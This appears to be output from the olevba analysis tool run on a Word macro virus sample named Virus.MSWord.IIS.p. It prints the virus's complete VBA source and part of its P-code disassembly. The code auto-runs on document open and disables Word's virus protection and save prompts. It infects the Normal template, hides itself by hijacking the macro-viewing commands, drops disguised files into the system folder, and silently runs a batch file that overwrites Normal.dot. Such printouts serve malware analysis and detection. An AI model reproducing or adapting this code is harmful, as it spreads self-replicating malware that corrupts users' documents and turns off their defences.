olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.IIS.p
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.IIS.p - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: Virus.MSWord.IIS.p - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo eb
'MyName=SuperIIS
Call MakeView
eb:
End Sub
Sub StealthDoc()
On Error GoTo eb
'Clean NormalTemplate:
ms = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To ms
a = NormalTemplate.VBProject.VBComponents.Item(i).CodeModule.countofLines
If a > 1 Then f = NormalTemplate.VBProject.VBComponents.Item(i).CodeModule.lines(1, 1)
If UCase(f) = "SUB VIEWVBCODE()" Then Exit For
Next i
If UCase(f) = "SUB VIEWVBCODE()" Then
a = NormalTemplate.VBProject.VBComponents(i).Name
Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=a, Object:=wdOrganizerObjectProjectItems
End If
For n = 1 To ms
a = NormalTemplate.VBProject.VBComponents.Item(n).CodeModule.countofLines
If a > 1 Then f = NormalTemplate.VBProject.VBComponents.Item(n).CodeModule.lines(3, 1)
If UCase(f) = "'MYNAME=SUPERIIS" Then Exit For
Next n
If UCase(f) = "'MYNAME=SUPERIIS" Then
a = NormalTemplate.VBProject.VBComponents(n).Name
Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=a, Object:=wdOrganizerObjectProjectItems
End If
f = ""
'Clean Document:
f = ""
ms = ActiveDocument.VBProject.VBComponents.Count
For ii = 1 To ms
a = ActiveDocument.VBProject.VBComponents.Item(ii).CodeModule.countofLines
If a > 1 Then f = ActiveDocument.VBProject.VBComponents.Item(ii).CodeModule.lines(1, 1)
If UCase(f) = "SUB VIEWVBCODE()" Then Exit For
Next ii
If UCase(f) = "SUB VIEWVBCODE()" Then
a = ActiveDocument.VBProject.VBComponents(ii).Name
Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=a, Object:=wdOrganizerObjectProjectItems
End If
For fg = 1 To ms
f = ""
a = ActiveDocument.VBProject.VBComponents.Item(fg).CodeModule.countofLines
If a > 1 Then f = ActiveDocument.VBProject.VBComponents.Item(fg).CodeModule.lines(3, 1)
If UCase(f) = "'MYNAME=SUPERIIS" Then Exit For
Next fg
If UCase(f) = "'MYNAME=SUPERIIS" Then
a = ActiveDocument.VBProject.VBComponents(fg).Name
Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=a, Object:=wdOrganizerObjectProjectItems
End If
esub:
Close
Open "c:\msdos.sys" For Input As #1
Do Until EOF(1)
Line Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l = Len(a)
windir = Mid(a, 8, l)
End If
Loop
x = NormalTemplate.VBProject.VBComponents(1).CodeModule.countofLines
Close
Open "c:\lo.sys" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close
NormalTemplate.VBProject.VBComponents.Import "c:\lo.sys"
NormalTemplate.VBProject.VBComponents(1).CodeModule.deleteLines 1, x
NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, "Private Sub ToolsMacro()"
NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 2, "Application.dialogs (wddialogtoolsmacro).show"
NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 3, "End Sub"
ShowVisualBasicEditor = True
If windir = "" Then Exit Sub
a = Shell(windir & "\system\lo.bat", 0)
eb:
End Sub
Sub MacroSDoc()
On Error GoTo eb
'Clean NormalTemplate:
ms = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To ms
a = NormalTemplate.VBProject.VBComponents.Item(i).CodeModule.countofLines
If a > 1 Then f = NormalTemplate.VBProject.VBComponents.Item(i).CodeModule.lines(1, 1)
If UCase(f) = "SUB VIEWVBCODE()" Then Exit For
Next i
If UCase(f) = "SUB VIEWVBCODE()" Then
a = NormalTemplate.VBProject.VBComponents(i).Name
Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=a, Object:=wdOrganizerObjectProjectItems
End If
For n = 1 To ms
a = NormalTemplate.VBProject.VBComponents.Item(n).CodeModule.countofLines
If a > 1 Then f = NormalTemplate.VBProject.VBComponents.Item(n).CodeModule.lines(3, 1)
If UCase(f) = "'MYNAME=SUPERIIS" Then Exit For
Next n
If UCase(f) = "'MYNAME=SUPERIIS" Then
a = NormalTemplate.VBProject.VBComponents(n).Name
Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=a, Object:=wdOrganizerObjectProjectItems
End If
f = ""
'Clean Document:
f = ""
ms = ActiveDocument.VBProject.VBComponents.Count
For ii = 1 To ms
a = ActiveDocument.VBProject.VBComponents.Item(ii).CodeModule.countofLines
If a > 1 Then f = ActiveDocument.VBProject.VBComponents.Item(ii).CodeModule.lines(1, 1)
If UCase(f) = "SUB VIEWVBCODE()" Then Exit For
Next ii
If UCase(f) = "SUB VIEWVBCODE()" Then
a = ActiveDocument.VBProject.VBComponents(ii).Name
Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=a, Object:=wdOrganizerObjectProjectItems
End If
For fg = 1 To ms
f = ""
a = ActiveDocument.VBProject.VBComponents.Item(fg).CodeModule.countofLines
If a > 1 Then f = ActiveDocument.VBProject.VBComponents.Item(fg).CodeModule.lines(3, 1)
If UCase(f) = "'MYNAME=SUPERIIS" Then Exit For
Next fg
If UCase(f) = "'MYNAME=SUPERIIS" Then
a = ActiveDocument.VBProject.VBComponents(fg).Name
Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=a, Object:=wdOrganizerObjectProjectItems
End If
esub:
Close
Open "c:\msdos.sys" For Input As #1
Do Until EOF(1)
Line Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l = Len(a)
windir = Mid(a, 8, l)
End If
Loop
If windir = "" Then Exit Sub
a = Shell(windir & "\system\lo.bat", 0)
x = NormalTemplate.VBProject.VBComponents(1).CodeModule.countofLines
Close
Open "c:\lo.sys" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close
NormalTemplate.VBProject.VBComponents.Import "c:\lo.sys"
NormalTemplate.VBProject.VBComponents(1).CodeModule.deleteLines 1, x
NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, "Private Sub ToolsMacro()"
NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 2, "Application.dialogs (wddialogtoolsmacro).show"
NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 3, "End Sub"
eb:
End Sub
Private Sub MakeView()
On Error GoTo eb
StealthCode = "Sub ViewVbCode()" & Chr(13)
StealthCode = StealthCode & "Call Stealth" & Chr(13)
StealthCode = StealthCode & "end sub" & Chr(13)
StealthCode = StealthCode & "sub ToolsMacro" & Chr(13)
StealthCode = StealthCode & "Call MacroS" & Chr(13)
StealthCode = StealthCode & "End Sub" & Chr(13)
ms = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To ms
a = NormalTemplate.VBProject.VBComponents.Item(i).CodeModule.countofLines
If a > 1 Then f = NormalTemplate.VBProject.VBComponents.Item(i).CodeModule.lines(1, 1)
If UCase(f) = "SUB VIEWVBCODE()" Then Exit For
Next i
If UCase(f) = "SUB VIEWVBCODE()" Then
NormalTemplate.VBProject.VBComponents.Item(i).CodeModule.deleteLines 1, a
NormalTemplate.VBProject.VBComponents.Item(i).CodeModule.AddFromString (StealthCode)
Else
Close
Open "c:\msdos.sys" For Input As #1
Do Until EOF(1)
Line Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l = Len(a)
windir = Mid(a, 8, l)
End If
Loop
If windir = "" Then Exit Sub
Close
gg = Dir(windir & "\system\losys.exe")
If gg <> "" Then Kill windir & "\system\losys.exe"
Open windir & "\System\losys.exe" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Print #1, StealthCode
Close
NormalTemplate.VBProject.VBComponents.Import windir & "\System\losys.exe"
End If
Call FileClose
eb:
End Sub
Sub FileClose()
On Error GoTo eb
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
Close
Open "c:\msdos.sys" For Input As #1
Do Until EOF(1)
Line Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l = Len(a)
windir = Mid(a, 8, l)
End If
Loop
If windir = "" Then Exit Sub
On Error GoTo NoInf
a = ActiveDocument.VBProject.VBComponents.Count
For i = 1 To a
ls = ActiveDocument.VBProject.VBComponents(i).CodeModule.countofLines
If ls > 1 Then l = ActiveDocument.VBProject.VBComponents(i).CodeModule.lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIIS" Then
acd = 1
Exit For
End If
Next i
If acd = 1 Then
FullCode = "Sub AutoExec" & Chr(13)
a = ActiveDocument.VBProject.VBComponents.Item(i).CodeModule.countofLines
For ii = 2 To a
If ii = 7 Then GoTo no2
If ii = 77 Then GoTo no2
If ii = 186 Then GoTo no2
If ii = 183 Then GoTo no2
l = ActiveDocument.VBProject.VBComponents.Item(i).CodeModule.lines(ii, 1)
FullCode = FullCode & l & Chr(13)
no2:
If ii = 7 Then FullCode = FullCode & "Sub Stealth" & Chr(13)
If ii = 77 Then FullCode = FullCode & "Sub MacroS" & Chr(13)
If ii = 186 Then FullCode = FullCode & "Sub AutoClose" & Chr(13)
If ii = 183 Then FullCode = FullCode & "Call AutoClose" & Chr(13)
Next ii
End If
a = NormalTemplate.VBProject.VBComponents.Count
For iii = 1 To a
ls = NormalTemplate.VBProject.VBComponents(iii).CodeModule.countofLines
If ls > 1 Then l = NormalTemplate.VBProject.VBComponents(iii).CodeModule.lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIIS" Then
NormT = 1
Exit For
End If
Next iii
If NormT = 1 Then
FullCode = "Sub AutoOpen" & Chr(13)
a = NormalTemplate.VBProject.VBComponents.Item(iii).CodeModule.countofLines
For iiii = 2 To a
If iiii = 7 Then GoTo non2
If iiii = 77 Then GoTo non2
If iiii = 186 Then GoTo non2
If iiii = 183 Then GoTo non2
l = NormalTemplate.VBProject.VBComponents.Item(iii).CodeModule.lines(iiii, 1)
FullCode = FullCode & l & Chr(13)
non2:
If iiii = 7 Then FullCode = FullCode & "Sub StealthDoc" & Chr(13)
If iiii = 77 Then FullCode = FullCode & "Sub MacroSDoc" & Chr(13)
If iiii = 186 Then FullCode = FullCode & "Sub FileClose" & Chr(13)
If iiii = 183 Then FullCode = FullCode & "Call FileClose" & Chr(13)
Next iiii
End If
If NormT <> 1 Then
a = Dir(windir & "\System\lo.sys")
If a <> "" Then Kill windir & "\System\lo.sys"
Application.NormalTemplate.OpenAsDocument
Close
d = Dir(windir & "\System\vmm64.vxd")
If d <> "" Then Kill windir & "\System\vmm64.vxd"
Open windir & "\System\Vmm64.vxd" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Print #1, FullCode
Close
ActiveDocument.VBProject.VBComponents.Import windir & "\System\Vmm64.VXD"
ActiveDocument.SaveAs FileName:=windir & "\System\lo.sys", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
ActiveDocument.Save
ActiveDocument.Close
a = Dir(windir & "\System\lo.bat")
If a <> "" Then Kill windir & "\System\lo.bat"
Close
Open windir & "\System\lo.bat" For Append As #1
Print #1, ":Begin"
l = Len(NormalTemplate.FullName)
l = l - 10
Print #1, "If not exist " & Left(NormalTemplate.FullName, l) & "~$Normal.dot goto start"
Print #1, "Goto Begin"
Print #1, ":Start"
Print #1, windir & "\command\Attrib.exe -s -h -r " & NormalTemplate.FullName
Print #1, "Copy/y " & windir & "\System\lo.sys " & NormalTemplate.FullName
Print #1, windir & "\command\Attrib.exe -s -h -r " & NormalTemplate.FullName
Print #1, "Copy/y " & windir & "\System\lo.sys " & NormalTemplate.FullName
Print #1, windir & "\command\Attrib.exe -s -h -r " & NormalTemplate.FullName
Print #1, "Copy/y " & windir & "\System\lo.sys " & NormalTemplate.FullName
Close
a = Shell(windir & "\System\lo.bat", 0)
End If
If acd <> 1 Then
Close
d = Dir(windir & "\System\vmm64.vxd")
If d <> "" Then Kill windir & "\System\vmm64.vxd"
Open windir & "\System\Vmm64.vxd" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Print #1, FullCode
Close
ActiveDocument.VBProject.VBComponents.Import windir & "\System\Vmm64.VXD"
If UCase(Left(ActiveDocument.FullName, 1)) <> "A" And Mid(ActiveDocument.FullName, 3, 1) = "\" Then ActiveDocument.Save
End If
NoInf:

eb:
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.IIS.p
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Modul1 - 17143 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError eb 
' Line #2:
' 	QuoteRem 0x0000 0x000F "MyName=SuperIIS"
' Line #3:
' 	ArgsCall (Call) MakeView 0x0000 
' Line #4:
' 	Label eb 
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Sub StealthDoc())
' Line #7:
' 	OnError eb 
' Line #8:
' 	QuoteRem 0x0000 0x0015 "Clean NormalTemplate:"
' Line #9:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #10:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #11:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countofLines 
' 	St a 
' Line #12:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St False 
' 	EndIf 
' Line #13:
' 	Ld False 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0010 "SUB VIEWVBCODE()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #14:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #15:
' 	Ld False 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0010 "SUB VIEWVBCODE()"
' 	Eq 
' 	IfBlock 
' Line #16:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St a 
' Line #17:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld a 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #20:
' 	Ld n 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countofLines 
' 	St a 
' Line #21:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld n 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St False 
' 	EndIf 
' Line #22:
' 	Ld False 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0010 "'MYNAME=SUPERIIS"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #23:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	NextVar 
' Line #24:
' 	Ld False 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0010 "'MYNAME=SUPERIIS"
' 	Eq 
' 	IfBlock 
' Line #25:
' 	Ld n 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St a 
' Line #26:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld a 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	LitStr 0x0000 ""
' 	St False 
' Line #29:
' 	QuoteRem 0x0000 0x000F "Clean Document:"
' Line #30:
' 	LitStr 0x0000 ""
' 	St False 
' Line #31:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #32:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #33:
' 	Ld ii 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countofLines 
' 	St a 
' Line #34:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ii 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St False 
' 	EndIf 
' Line #35:
' 	Ld False 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0010 "SUB VIEWVBCODE()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #36:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	NextVar 
' Line #37:
' 	Ld False 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0010 "SUB VIEWVBCODE()"
' 	Eq 
' 	IfBlock 
' Line #38:
' 	Ld ii 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St a 
' Line #39:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld a 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Ld fg 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #42:
' 	LitStr 0x0000 ""
' 	St False 
' Line #43:
' 	Ld fg 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countofLines 
' 	St a 
' Line #44:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld fg 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St False 
' 	EndIf 
' Line #45:
' 	Ld False 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0010 "'MYNAME=SUPERIIS"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #46:
' 	StartForVariable 
' 	Ld fg 
' 	EndForVariable 
' 	NextVar 
' Line #47:
' 	Ld False 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0010 "'MYNAME=SUPERIIS"
' 	Eq 
' 	IfBlock 
' Line #48:
' 	Ld fg 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St a 
' Line #49:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld a 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	Label esub 
' Line #52:
' 	CloseAll 
' Line #53:
' 	LitStr 0x000C "c:\msdos.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #54:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' Line #55:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #56:
' 	Ld a 
' 	ArgsLd UCase 0x0001 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "WINDIR="
' 	Eq 
' 	IfBlock 
' Line #57:
' 	Ld a 
' 	FnLen 
' 	St l 
' Line #58:
' 	Ld a 
' 	LitDI2 0x0008 
' 	Ld l 
' 	ArgsLd Mid$ 0x0003 
' 	St windir 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	Loop 
' Line #61:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countofLines 
' 	St x 
' Line #62:
' 	CloseAll 
' Line #63:
' 	LitStr 0x0009 "c:\lo.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #64:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Modul1"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #65:
' 	CloseAll 
' Line #66:
' 	LitStr 0x0009 "c:\lo.sys"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #67:
' 	LitDI2 0x0001 
' 	Ld x 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deleteLines 0x0002 
' Line #68:
' 	LitDI2 0x0001 
' 	LitStr 0x0018 "Private Sub ToolsMacro()"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #69:
' 	LitDI2 0x0002 
' 	LitStr 0x002D "Application.dialogs (wddialogtoolsmacro).show"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #70:
' 	LitDI2 0x0003 
' 	LitStr 0x0007 "End Sub"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #71:
' 	LitVarSpecial (True)
' 	St ShowVisualBasicEditor 
' Line #72:
' 	Ld windir 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #73:
' 	Ld windir 
' 	LitStr 0x000E "\system\lo.bat"
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsLd Shell 0x0002 
' 	St a 
' Line #74:
' 	Label eb 
' Line #75:
' 	EndSub 
' Line #76:
' 	FuncDefn (Sub MacroSDoc())
' Line #77:
' 	OnError eb 
' Line #78:
' 	QuoteRem 0x0000 0x0015 "Clean NormalTemplate:"
' Line #79:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #80:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #81:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countofLines 
' 	St a 
' Line #82:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St False 
' 	EndIf 
' Line #83:
' 	Ld False 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0010 "SUB VIEWVBCODE()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #84:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #85:
' 	Ld False 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0010 "SUB VIEWVBCODE()"
' 	Eq 
' 	IfBlock 
' Line #86:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St a 
' Line #87:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld a 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #88:
' 	EndIfBlock 
' Line #89:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #90:
' 	Ld n 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countofLines 
' 	St a 
' Line #91:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld n 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St False 
' 	EndIf 
' Line #92:
' 	Ld False 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0010 "'MYNAME=SUPERIIS"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #93:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	NextVar 
' Line #94:
' 	Ld False 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0010 "'MYNAME=SUPERIIS"
' 	Eq 
' 	IfBlock 
' Line #95:
' 	Ld n 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St a 
' Line #96:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld a 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #97:
' 	EndIfBlock 
' Line #98:
' 	LitStr 0x0000 ""
' 	St False 
' Line #99:
' 	QuoteRem 0x0000 0x000F "Clean Document:"
' Line #100:
' 	LitStr 0x0000 ""
' 	St False 
' Line #101:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #102:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #103:
' 	Ld ii 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countofLines 
' 	St a 
' Line #104:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ii 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St False 
' 	EndIf 
' Line #105:
' 	Ld False 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0010 "SUB VIEWVBCODE()"
' 	Eq 
' 	If 
' 	BoSImplicit 
